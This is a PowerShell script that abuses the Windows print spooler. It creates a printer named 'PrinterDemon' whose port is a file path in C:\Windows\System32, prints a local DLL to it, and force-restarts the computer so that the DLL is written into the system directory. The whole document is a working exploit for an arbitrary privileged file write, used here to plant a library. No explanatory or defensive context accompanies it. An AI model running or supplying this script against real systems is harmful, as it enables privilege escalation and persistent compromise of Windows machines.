$printerName = "PrinterDemon"
$driverName = "Generic / Text Only"
$portName = "c:\windows\system32\MathLib.dll"

# $stringTest = "Th1s is 4 fr34k!ng t3st"

# remove printer, driver and port 
Remove-Printer $printerName
Remove-PrinterPort $portName
Remove-PrinterDriver $driverName


# add printer driver, which supports all ASCII characters and most
# characters of other character sets
echo "[] Adding printer driver -> $driverName <-"
Add-PrinterDriver -Name $driverName
echo "[+] Done"

# display printer drivers installed
#Get-PrinterDriver

# add printer port (to associate then to our printer)
echo "[] Adding printer port -> $portName <-"
Add-PrinterPort -Name $portName
echo "[+] Done"

# list printer ports installed in the machine
echo "[] Listing printer ports ..."
Get-PrinterPort | ft Name

# create printer + bind it to driver and port just created
echo "[] Adding printer $printername and binding to previously created port+driver"
Add-Printer -name $printerName -DriverName $driverName -PortName $portName
echo "[+] Done"

# list printers installed in machine
#Get-Printer | ft name,portname

#NOTE: its important to write (into the file) BEFORE restarting the system
echo "[] Writing to printer $printerName ..."
Get-Content -Path C:\Users\Bob\Desktop\program\MathLib.dll | Out-Printer -name $printerName
echo "[+] DONE"

echo "Restarting pc in 10s ..."
Start-Sleep -Seconds 10
echo "Restarting ..."
Restart-Computer -Force